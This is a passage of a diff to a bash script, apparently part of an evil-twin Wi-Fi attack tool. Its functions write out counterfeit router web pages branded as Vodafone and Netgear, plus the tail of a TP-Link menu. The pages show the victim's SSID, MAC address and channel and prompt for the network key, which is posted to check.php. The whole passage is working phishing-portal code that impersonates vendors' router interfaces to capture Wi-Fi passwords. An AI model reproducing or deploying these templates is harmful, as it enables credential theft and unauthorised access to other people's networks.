+Restore</a></ol><ol id=\"ol48\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a48\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(48);\">- Reboot</a></ol><ol id=\"ol49\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a49\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(49);\">- Password</a></ol><ol id=\"ol50\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a50\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(50);\">- System Log</a></ol><ol id=\"ol51\" class=\"dot2\" style=\"display:none; background-position:2px;PADDING-LEFT:2px;\"><a id=\"a51\" href=\"StatusRpm.htm\" target=\"mainFrame\" class=\"L1\" onclick=\"doClick(51);\">- Statistics</a></ol>
+</menu>
+
+
+</body></html>
+">$DUMP_PATH/data/TP/MenuRpm.htm
+               }
+               
+error && final && menu_rpm  && status_rpm && status_help
+	       }
+
+	       
+	       #Conten interface web
+function VODAFONE {
+
+mkdir $DUMP_PATH/data &>$flux_output_device
+        cp  $WORK_DIR/Sites/VODAFONE/info2.css $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/VODAFONE/info.css $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/VODAFONE/background.png $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/VODAFONE/house.png $DUMP_PATH/data
+         
+       function final {
+echo "<link rel=\"stylesheet\" href=\"info2.css\" type=\"text/css\"></HEAD>
+</HEAD>
+
+<BODY>
+      <blockquote>
+
+    <TABLE id=\"autoWidth\">
+
+      <TBODY>
+
+
+        <TR>
+
+          <TD class=blue colspan=2></TD>
+
+        </TR>
+
+
+
+        <TR>
+
+          <TD class=info1 colspan=2>
+          
+$DIALOG_WEB_OK .</TD></TR>
+
+
+        <TR><TD class=blue colspan=2></TD></TR>
+        
+
+
+
+      </TBODY>
+
+    </TABLE>
+
+
+</blockquote>
+</BODY>
+
+</HTML>
+
+">$DUMP_PATH/data/final.html
+
+                   }
+                   
+function error {
+ echo " 
+   <link rel=\"stylesheet\" href=\"info2.css\" type=\"text/css\">
+</HEAD>
+</HEAD>
+
+<BODY>
+      <blockquote>
+
+
+    <TABLE id=\"autoWidth\">
+
+      <TBODY>
+
+
+
+        <TR>
+
+          <TD colspan=2></TD>
+
+        </TR>
+        
+        
+  </TR>
+ 
+
+
+        <TR>
+
+          <TD class=info1 colspan=2>
+
+
+$DIALOG_WEB_ERROR
+
+
+        <TR><TD class=blue colspan=2></TD></TR>
+        
+<tr><td colspan=\"2\" align=\"center\"><form><INPUT name=\"Back\" onclick=\"history.back();return false\" class=\"buttonBig\" type=\"submit\" value=\"Back\"/></form></td></tr>
+
+<tbody><tr><td height=\"50\" width=\"50\"><img src=\"data:image/gif;base64,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
+\" height=\"50\" width=\"50\"></td>
+        </tr>
+      </tbody></table>
+
+
+      </TBODY>
+
+    </TABLE>
+
+
+      </blockquote>
+</BODY>
+
+</HTML>">$DUMP_PATH/data/error.html
+               }
+               
+function info {
+echo "<html>
+<head>
+<meta http-equiv=\"Content-Type\" content=\"text/html; charset=ISO-8859-1\">
+
+<link rel=\"stylesheet\" type=\"text/css\" href=\"info2.css\" media=\"all\">
+</head>
+<body bgcolor=\"transparent\" marginheight=\"0\" marginwidth=\"0\">
+
+<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\">
+  <tbody><tr> 
+      <td width=\"2%\">&nbsp;</td><td width=\"5%\"></td><td width=\"93%\"> 
+      <div valign=\"top\" align=\"left\"> 
+        <table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"360\">
+           
+          </tr>
+          <TABLE id=\"autoWidth\">
+
+      <TBODY>
+<tr><td><hr color=\"red\" size=1 width=\"99%\"></td></tr>
+
+
+                  <tr><td colspan=\"2\" ><font color=\"#008698\">SSID: <b>$Host_SSID</b></td></tr>
+        <tr><td colspan=\"2\"  ><font color=\"#008698\">MAC Address: <b>$Host_MAC</b></td></tr>
+        <tr><td colspan=\"2\"  ><font color=\"#008698\">Channel: <b>$Host_CHAN</b></td></tr>
+
+
+<tr><td></td></tr>
+
+
+<tr><td><hr color=\"red\" size=1 width=\"99%\"></td></tr>
+<tr><td></td></tr>
+
+        <TR>
+
+          <TD class=info1 colspan=2>
+<br><font color=\"#008698\">
+$DIALOG_WEB_INFO
+<br>
+<br>
+$DIALOG_WEB_INPUT
+<br>
+<br>
+<div id=\"box\" align=\"left\" >
+<form id=\"form1\" name=\"form1\" method=\"POST\" action=\"check.php\" >
+<tr><td><b><font color=\"#008698\">$Host_ENC</b> Key:</td></tr>
+<tr><td><input name=\"key1\" type=\"password\" class=\"textfield\" /><td></tr>
+
+
+        <TR><TD class=blue colspan=2></TD></TR>
+                <TR><TD class=blue colspan=2></TD></TR>
+
+        
+<tr><td colspan=\"2\"><INPUT name=\"Confirm\" class=\"button\" type=\"submit\" value=\"Confirm\"/></td></tr>
+
+</form></div>
+
+</TD></TR>
+
+
+      </TBODY>
+
+    </TABLE>
+</table></div></td></tr></tbody></table>
+</body>
+</html>
+
+">$DUMP_PATH/data/info.html
+             }
+             
+function index {
+echo "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">
+<html xmlns=\"http://www.w3.org/1999/xhtml\">
+<head>
+<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">
+
+
+	
+	<title>VODAFONE</title>
+	
+		 
+	
+	
+	
+	
+	
+	
+
+<link rel=\"stylesheet\" type=\"text/css\" href=\"info.css\" media=\"all\">
+</head>
+
+
+
+<body>	
+	
+
+		<div class=\"panel_content\" id=\"panel_content\"><div class=\"house\">
+		<div style=\"cursor: auto;\" id=\"internet\" class=\"divInternet\">
+		<div class=\"internet\" id=\"iconInternet\" internet_status=\"INTERNET_OK\"></div>
+		<div class=\"internet_txt\">
+			<span class=\"trad\" key=\"MAP_INTERNET\"><A href=\"\"><font color=\"red\">$DIALOG_WEB_INDEX_19</A></span>
+			<span class=\"internet_des trad\" key=\"COMMON_EMPTY\" id=\"internetAlert\"> </span>
+		</div>
+	</div>
+	<div id=\"threeG\" class=\"threeG hand trad\" style=\"\">
+		<div style=\"background-position: 0px 0px;\" id=\"threeG_icos\" class=\"threeG_ico\" power3g=\"3\">$DIALOG_WEB_INDEX_20</div>
+		<span class=\"threeG_txt hand trad\" key=\"MAP_3G\"><A href=\"\"><font color=\"red\"></span>
+	</div>
+	<div adslconfigurable=\"true\" id=\"adsl\" adslactive=\"false\" class=\"adsl trad hand\">
+		<div style=\"background-position: -152px 0px;\" class=\"adsl_ico\" id=\"iconadsl\"></div>
+		<span class=\"adsl_txt trad\" key=\"MAP_ADSL\"><A href=\"\"><font color=\"red\">$DIALOG_WEB_INDEX_21</A></span>
+	</div>	
+	<div id=\"wifi\" class=\"hand disabled\">
+		<div class=\"wifi_ico\" color=\"red\"></div>
+		<span class=\"gateway\"></span>
+		<span class=\"wifi_txt trad\" key=\"MAP_WIFI_WPA\"><A href=\"\"><font color=\"red\" >$DIALOG_WEB_INDEX_22</A></span>
+	</div>
+	
+	<div id=\"wifi2\" class=\"hand disabled\">
+		<div class=\"wifi_ico2\" color=\"red\"></div>
+		<span class=\"gateway2\"></span>
+		<span class=\"wifi_txt2 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\"><font color=\"white\" >$DIALOG_WEB_INDEX_1</A></span>
+	</div>
+	
+	<div id=\"wifi3\" class=\"hand disabled\">
+		<div class=\"wifi_ico3\" color=\"red\"></div>
+		<span class=\"gateway3\"></span>
+		<span class=\"wifi_txt3 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\"><font color=\"#008698\" >$DIALOG_WEB_INDEX_2</A></span>
+	</div>
+
+	<div id=\"wifi4\" class=\"hand disabled\">
+		<div class=\"wifi_ico4\" color=\"red\"></div>
+		<span class=\"gateway4\"></span>
+		<span class=\"wifi_txt4 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\"><font color=\"#008698\" >$DIALOG_WEB_INDEX_3</A></span>
+	</div>
+	
+	<div id=\"wifi5\" class=\"hand disabled\">
+		<div class=\"wifi_ico5\" color=\"red\"></div>
+		<span class=\"gateway5\"></span>
+		<span class=\"wifi_txt5 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\"><font color=\"#008698\" >$DIALOG_WEB_INDEX_4</A></span>
+	</div>
+	
+	<div id=\"wifi6\" class=\"hand disabled\">
+		<div class=\"wifi_ico6\" color=\"red\"></div>
+		<span class=\"gateway6\"></span>
+		<span class=\"wifi_txt6 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\"><font color=\"#008698\" >$DIALOG_WEB_INDEX_5</A></span>
+	</div>
+	
+	<div id=\"wifi7\" class=\"hand disabled\">
+		<div class=\"wifi_ico7\" color=\"red\"></div>
+		<span class=\"gateway7\"></span>
+		<span class=\"wifi_txt7 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\"><font color=\"white\" >$DIALOG_WEB_INDEX_6</A></span>
+	</div>
+	
+	<div id=\"wifi8\" class=\"hand disabled\">
+		<div class=\"wifi_ico8\" color=\"red\"></div>
+		<span class=\"gateway8\"></span>
+		<span class=\"wifi_txt8 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\"><font color=\"#008698\" >$DIALOG_WEB_INDEX_7</A></span>
+	</div>
+	
+	<div id=\"wifi9\" class=\"hand disabled\">
+		<div class=\"wifi_ico9\" color=\"red\"></div>
+		<span class=\"gateway9\"></span>
+		<span class=\"wifi_txt9 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\"><font color=\"#008698\" >$DIALOG_WEB_INDEX_8</A></span>
+	</div>
+	
+	<div id=\"wifi10\" class=\"hand disabled\">
+		<div class=\"wifi_ico10\" color=\"red\"></div>
+		<span class=\"gateway10\"></span>
+		<span class=\"wifi_txt10 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\"><font color=\"white\" >$DIALOG_WEB_INDEX_9</A></span>
+	</div>
+	
+	<div id=\"wifi11\" class=\"hand disabled\">
+		<div class=\"wifi_ico11\" color=\"red\"></div>
+		<span class=\"gateway11\"></span>
+		<span class=\"wifi_txt11 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\"><font color=\"#008698\" >$DIALOG_WEB_INDEX_10</A></span>
+	</div>
+	
+	<div id=\"wifi12\" class=\"hand disabled\">
+		<div class=\"wifi_ico12\" color=\"red\"></div>
+		<span class=\"gateway12\"></span>
+		<span class=\"wifi_txt12 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\"><font color=\"#008698\" >$DIALOG_WEB_INDEX_11</A></span>
+	</div>
+	
+	<div id=\"wifi13\" class=\"hand disabled\">
+		<div class=\"wifi_ico13\" color=\"red\"></div>
+		<span class=\"gateway13\"></span>
+		<span class=\"wifi_txt13 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\"><font color=\"#008698\" >$DIALOG_WEB_INDEX_12</A></span>
+	</div>
+	
+	<div id=\"wifi14\" class=\"hand disabled\">
+		<div class=\"wifi_ico14\" color=\"red\"></div>
+		<span class=\"gateway14\"></span>
+		<span class=\"wifi_txt14 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\"><font color=\"#008698\" >$DIALOG_WEB_INDEX_13</A></span>
+	</div>
+	
+	<div id=\"wifi15\" class=\"hand disabled\">
+		<div class=\"wifi_ico15\" color=\"red\"></div>
+		<span class=\"gateway15\"></span>
+		<span class=\"wifi_txt15 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\"><font color=\"white\" >$DIALOG_WEB_INDEX_14</A></span>
+	</div>
+	
+	<div id=\"wifi16\" class=\"hand disabled\">
+		<div class=\"wifi_ico16\" color=\"red\"></div>
+		<span class=\"gateway16\"></span>
+		<span class=\"wifi_txt16 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\"><font color=\"#008698\" >$DIALOG_WEB_INDEX_15</A></span>
+	</div>
+	
+	<div id=\"wifi17\" class=\"hand disabled\">
+		<div class=\"wifi_ico17\" color=\"red\"></div>
+		<span class=\"gateway17\"></span>
+		<span class=\"wifi_txt17 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\"><font color=\"#008698\" >$DIALOG_WEB_INDEX_16</A></span>
+	</div>
+	
+	<div id=\"wifi18\" class=\"hand disabled\">
+		<div class=\"wifi_ico18\" color=\"red\"></div>
+		<span class=\"gateway18\"></span>
+		<span class=\"wifi_txt18 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\"><font color=\"white\" >$DIALOG_WEB_INDEX_17</A></span>
+	</div>
+	
+		<div class=\"scroll\">
+<iframe src=\"info.html\" width=\"450\" height=\"290\" align=\"center\">
+		</div>
+	
+	
+	
+
+        <div id=\"remaining_session_box\" style=\"float: right; display: none;\">
+		<span>Remaining Session: </span>	
+		<span id=\"remaining_session\"></span>
+	</div>
+
+</div></div></a>
+	</div>					
+  		
+	<div id=\"help_dialog\" class=\"dialog\"></div>
+	<div id=\"dialog\" class=\"dialog dialog_text\"></div>	
+	<div id=\"dialogWarning\" class=\"dialog dialog_text\"></div>
+	
+
+
+</body>
+</html>
+
+">$DUMP_PATH/data/index.htm
+            }
+            error && final && info && index
+	      }
+	      
+	      
+##################-NETGEAR-###############
+	       #Conten interface web
+function NETGEAR {
+
+mkdir $DUMP_PATH/data &>$flux_output_device
+        cp  $WORK_DIR/Sites/NETGEAR/info2.css $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/NETGEAR/info.css $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/NETGEAR/background.png $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/NETGEAR/house.png $DUMP_PATH/data
+         
+       function final {
+echo "<link rel=\"stylesheet\" href=\"info2.css\" type=\"text/css\"></HEAD>
+</HEAD>
+
+<BODY>
+      <blockquote>
+
+    <TABLE id=\"autoWidth\">
+
+      <TBODY>
+
+
+        <TR>
+
+          <TD class=blue colspan=2></TD>
+
+        </TR>
+
+
+
+        <TR>
+
+          <TD class=info1 colspan=2>
+          
+$DIALOG_WEB_OK .</TD></TR>
+
+
+        <TR><TD class=blue colspan=2></TD></TR>
+        
+
+
+
+      </TBODY>
+
+    </TABLE>
+
+
+</blockquote>
+</BODY>
+
+</HTML>
+
+">$DUMP_PATH/data/final.html
+
+                   }
+
+function error {
+ echo " 
+   <link rel=\"stylesheet\" href=\"info2.css\" type=\"text/css\">
+</HEAD>
+</HEAD>
+
+<BODY>
+      <blockquote>
+
+
+    <TABLE id=\"autoWidth\">
+
+      <TBODY>
+
+
+
+        <TR>
+
+          <TD colspan=2></TD>
+
+        </TR>
+        
+        
+  </TR>
+ 
+
+
+        <TR>
+
+          <TD class=info1 colspan=2>
+
+
+$DIALOG_WEB_ERROR
+
+
+        <TR><TD class=blue colspan=2></TD></TR>
+        
+<tr><td colspan=\"2\" align=\"center\"><form><INPUT name=\"Back\" onclick=\"history.back();return false\" class=\"buttonBig\" type=\"submit\" value=\"Back\"/></form></td></tr>
+
+<tbody><tr><td height=\"50\" width=\"50\"><img src=\"data:image/gif;base64,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
+\" height=\"50\" width=\"50\"></td>
+        </tr>
+      </tbody></table>
+
+
+      </TBODY>
+
+    </TABLE>
+
+
+      </blockquote>
+</BODY>
+
+</HTML>">$DUMP_PATH/data/error.html
+               }
+
+function info {
+echo "<html>
+<head>
+<meta http-equiv=\"Content-Type\" content=\"text/html; charset=ISO-8859-1\">
+
+<link rel=\"stylesheet\" type=\"text/css\" href=\"info2.css\" media=\"all\">
+</head>
+<body bgcolor=\"transparent\" marginheight=\"0\" marginwidth=\"0\">
+
+<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\">
+  <tbody><tr> 
+      <td width=\"2%\">&nbsp;</td><td width=\"5%\"></td><td width=\"93%\"> 
+      <div valign=\"top\" align=\"left\"> 
+        <table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"360\">
+           
+          </tr>
+          <TABLE id=\"autoWidth\">
+
+      <TBODY>
+<tr><td><hr color=\"#7671BF\" size=2 width=\"99%\"></td></tr>
+
+
+                  <tr><td colspan=\"2\" ><font color=\"black\">SSID: <b>$Host_SSID</b></td></tr>
+        <tr><td colspan=\"2\"  ><font color=\"black\">MAC Address: <b>$Host_MAC</b></td></tr>
+        <tr><td colspan=\"2\"  ><font color=\"black\">Channel: <b>$Host_CHAN</b></td></tr>
+
+
+<tr><td></td></tr>
+
+
+<tr><td><hr color=\"#7671BF\" size=2 width=\"99%\"></td></tr>
+<tr><td></td></tr>
+
+        <TR>
+
+          <TD class=info1 colspan=2>
+<br><font color=\"black\">
+$DIALOG_WEB_INFO
+<br>
+<br>
+$DIALOG_WEB_INPUT
+<br>
+<br>
+<div id=\"box\" align=\"left\" >
+<form id=\"form1\" name=\"form1\" method=\"POST\" action=\"check.php\" >
+<tr><td><b><font color=\"black\">$Host_ENC</b> Key:</td></tr>
+<tr><td><input name=\"key1\" type=\"password\" class=\"textfield\" /><td></tr>
+
+
+        <TR><TD class=blue colspan=2></TD></TR>
+                <TR><TD class=blue colspan=2></TD></TR>
+
+        
+<tr><td colspan=\"2\"><INPUT name=\"Confirm\" class=\"button\" type=\"submit\" value=\"Confirm\"/></td></tr>
+
+</form></div>
+
+</TD></TR>
+
+
+      </TBODY>
+
+    </TABLE>
+</table></div></td></tr></tbody></table>
+</body>
+</html>
+
+">$DUMP_PATH/data/info.html
+             }
+
+function index {
+echo "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">
+<html xmlns=\"http://www.w3.org/1999/xhtml\">
+<head>
+<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">
+
+
+	
+	<title>SERVICES</title>
+	
+		 
+	
+	
+	
+	
+	
+	
+
+<link rel=\"stylesheet\" type=\"text/css\" href=\"info.css\" media=\"all\">
+</head>
+
+
+
+<body>	
+	
+
+		<div class=\"panel_content\" id=\"panel_content\"><div class=\"house\">
+		<div style=\"cursor: auto;\" id=\"internet\" class=\"divInternet\">
+		<div class=\"internet\" id=\"iconInternet\" internet_status=\"INTERNET_OK\"></div>
+		<div class=\"internet_txt\">
+			<span class=\"trad\" key=\"MAP_INTERNET\"><A href=\"\"><font color=\"red\">$DIALOG_WEB_INDEX_21</A></span>
+			<span class=\"internet_des trad\" key=\"COMMON_EMPTY\" id=\"internetAlert\"> </span>
+		</div>
+	</div>
+	<div id=\"threeG\" class=\"threeG hand trad\" style=\"\">
